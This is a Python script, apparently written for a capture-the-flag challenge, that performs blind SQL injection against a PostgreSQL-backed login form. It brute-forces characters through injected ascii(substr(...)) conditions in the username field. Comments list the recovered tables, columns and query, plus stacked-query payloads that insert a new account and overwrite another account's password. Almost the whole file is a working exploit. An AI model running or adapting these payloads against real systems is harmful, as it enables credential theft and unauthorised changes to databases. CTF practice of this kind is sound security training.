import time 
import requests

url = 'https://pasteweb.ctf.zoolab.org/'

session_requests = requests.session()
# r = requests.get(url)
# cookie = r.cookies

def guess_qq(name):
    guess = b''
    #guess = b"SELECT user_account, user_password FROM pasteweb_accounts WHERE user_password='"
    index = 1
    while True :
        count = 0 
        for i in range(0x1f,0x80):
            count += 1
            current_time = time.time()
            username = f"' or ascii(substr({name},{index},{index})) = {i} --"
            payload = {
                'username' : username,
                'password' : "12345",
                'current_time' : current_time
            }

            x = session_requests.post(url=url,data=payload)
            if b'Bad Hacker' in x.content :
                index += 1
                guess += int.to_bytes(i,1,'little')
                print(guess)
                break

        if count > (0x80-0x1f)-1 :
            print(f'Something went Wrong or end of string')
            break  



guess_qq("cast((SELECT current_setting('is_superuser') LIMIT 1 offset 0) as text)")
#guess_qq("cast((SELECT setting FROM pg_settings LIMIT 1 offset 1) as text)")
#guess_qq("cast((SELECT user_account FROM pasteweb_accounts   LIMIT 1 offset 8) as text)")
#guess_qq("version()")




## table : pasteweb_accounts, pg_type, pg_foreign_table, pg_roles , s3cr3t_t4b1e
## column : user_account, user_password
## current_db = pastewebdb , template0 ,template1
## current_user = web
## current_schema=public
## current_query = SELECT user_account, user_password FROM pasteweb_accounts WHERE user_password='7215ee9c7d9dc229d2921a40e899ec5f' AND user_account=' 
## ' ; INSERT INTO pasteweb_accounts (user_account, user_password) VALUES('eeeee','594f803b380a41396ed63dca39503542') -- 
## ' or '789'=cast((SELECT user_account from pasteweb_accounts where user_account='789' and user_password='67c762276bced09ee4df0ed537d164ea') as text) ;--
## ' ; UPDATE pasteweb_accounts set user_password='a008b609dd552dca425779a8e1882485' where user_account='ccccc'--
## cast((SELECT user_password FROM pasteweb_accounts LIMIT 1 offset 0) as text)


## 16384